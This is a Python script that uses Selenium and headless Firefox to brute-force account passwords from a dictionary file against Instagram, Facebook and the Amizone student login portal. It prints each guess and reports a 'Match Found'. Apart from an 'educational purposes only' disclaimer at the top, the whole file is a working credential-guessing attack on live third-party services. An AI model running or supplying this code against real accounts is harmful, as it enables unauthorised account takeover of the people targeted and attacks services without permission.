'''
Any mishandling done by anyone will solely be his or her responsibility.
This file is meant only for educational purposes and not to harm any individual or any organization.
'''

'''
Place the file in the folder that contains the dictionary file.
After placing the file, run this python file.
'''

'''
Requirements:
1. time
2. selenium 
'''


import time
from selenium.webdriver import Firefox
from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import  expected_conditions as EC

filename = input('Enter the file of dictionary : ')

def instagram():
    url = 'https://www.instagram.com'
    options = webdriver.FirefoxOptions()
    options.add_argument('--headless')
    username = input("Username : ")
    global filename
    driver = Firefox(executable_path = r'C:\\Users\\sansk\\Desktop\\geckodriver.exe', options = options)
    driver.get(url)
    driver.implicitly_wait(1)
    file = open(filename, 'r')
    driver.find_element(By.NAME, "username").send_keys(username)
    i = -1
    for password in file.readlines():
        i += 1
        password = password.strip("\n")
        print(f'Trying [{password}]')
        driver.find_element(By.NAME, 'password').clear()
        #driver.implicitly_wait(30)
        driver.find_element(By.NAME, 'password').clear()
        driver.find_element(By.NAME, 'password').send_keys(password)
        driver.find_element(By.XPATH, '//*[@id="loginForm"]/div/div[3]').click()
        time.sleep(3)
        url = url.split('/')
        temp = driver.current_url.split('/')
        temp = "".join(temp)
        url = "".join(url)
        
        if temp == url:
            continue
        else:
            print(f'Match Found : Password : {password}')
            break
    file.close()

def amizone():
    url = 'https://s.amizone.net'
    username = input("Username : ")
    global filename
    options = webdriver.FirefoxOptions()
    options.add_argument('--headless')
    driver = Firefox(executable_path = r'C:\\Users\\sansk\\Desktop\\geckodriver.exe', options = options)
    driver.get(url)
    file = open(filename, 'r')
    for password in file.readlines():
        password = password.strip("\n")
        driver.find_element(By.NAME, '_UserName').send_keys(username)
        print(f'Trying [{password}]')
        driver.find_element(By.NAME, '_Password').send_keys(password)
        driver.find_element(By.CLASS_NAME, 'login100-form-btn').click()
        url = url.split('/')
        temp = driver.current_url.split('/')
        temp = "".join(temp)
        url = "".join(url)
        if temp == url:
            continue
        else:
            print(f'Match Found : Password : {password}')
            break
    file.close()

def fb():
    url = 'https://www.facebook.com'
    username = input("Username : ")
    global filename
    options = webdriver.FirefoxOptions()
    options.add_argument('--headless')
    driver = Firefox(executable_path = r'C:\\Users\\sansk\\Desktop\\geckodriver.exe', options = options)
    driver.get(url)
    driver.find_element(By.NAME, 'email').send_keys(username)
    file = open(filename, 'r')
    for password in file.readlines():
        password = password.strip("\n")
        print(f'Trying [{password}]')
        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.NAME, 'pass'))).send_keys(password)
        driver.find_element(By.NAME, 'login').click()
        try:
            WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.CLASS_NAME, "_9ay7")))
        except Exception as e:
            print(f'Match Found : Password : {password}')
            break
        continue
    file.close()

if __name__ == '__main__':
    
    service = input("Enter service : ")
    
    if 'amizone' in service:
        amizone()

    elif 'inst' in service:
        instagram()

    elif 'fb' in service:
        fb()
